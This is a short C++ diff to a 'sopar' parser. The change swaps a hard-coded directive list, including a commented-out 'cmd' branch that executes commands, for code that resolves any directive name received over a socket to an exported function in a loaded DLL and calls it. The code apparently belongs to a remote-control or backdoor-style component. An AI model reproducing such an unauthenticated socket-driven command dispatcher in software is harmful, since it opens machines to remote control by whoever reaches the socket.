@@ -1,6 +1,7 @@
 #include "sopar.h"
 
 #include "../external.h"
+#include "../apiget/export.h"
 
 extern struct DllMeta_ DllMeta;
 
@@ -17,6 +18,18 @@ void sopar::parse()
     {
         return;
     }
+    
+    void *fp;
+    
+    if( fp = GetExport((HMODULE)DllMeta.where, this->buf) ){
+        ( (void (*)(SOCKET, const char *))fp )(this->sock, this->buf + strlen(this->buf) + 1);
+    }else{
+        this->sopar_send("undefined directive: ");
+        this->sopar_send(this->buf);
+        this->sopar_send("\n");
+    }
+    
+    /*
     else if(!strcmp(this->buf, "cmd"))
     {
         this->sopar_send("executing command: ");
@@ -57,4 +70,5 @@ void sopar::parse()
         this->sopar_send("\n");
         return;
     }
+    */
 }
